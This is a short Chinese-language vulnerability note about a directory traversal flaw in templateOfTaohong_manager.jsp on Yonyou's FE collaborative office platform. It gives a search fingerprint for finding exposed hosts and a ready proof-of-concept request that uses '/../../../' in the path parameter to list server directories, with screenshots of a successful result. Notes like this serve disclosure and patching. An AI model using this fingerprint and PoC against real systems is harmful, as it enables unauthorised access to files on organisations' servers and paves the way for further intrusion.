# 用友 FE协作办公平台 templateOfTaohong_manager.jsp 目录遍历漏洞

## 漏洞描述

用友 FE协作办公平台 templateOfTaohong_manager.jsp文件存在目录遍历漏洞，通过漏洞攻击者可以获取目录文件等信息，导致进一步攻击

## 漏洞影响

```
用友 FE协作办公平台
```

## 网络测绘

```
"FE协作"
```

## 漏洞复现

登录页面

![image-20220520141413849](https://raw.githubusercontent.com/sunwu57/tuchuang/main/img/20250326113055002.png)

验证POC

```
/system/mediafile/templateOfTaohong_manager.jsp?path=/../../../
```

![image-20220520141519859](https://raw.githubusercontent.com/sunwu57/tuchuang/main/img/20250326113055003.png)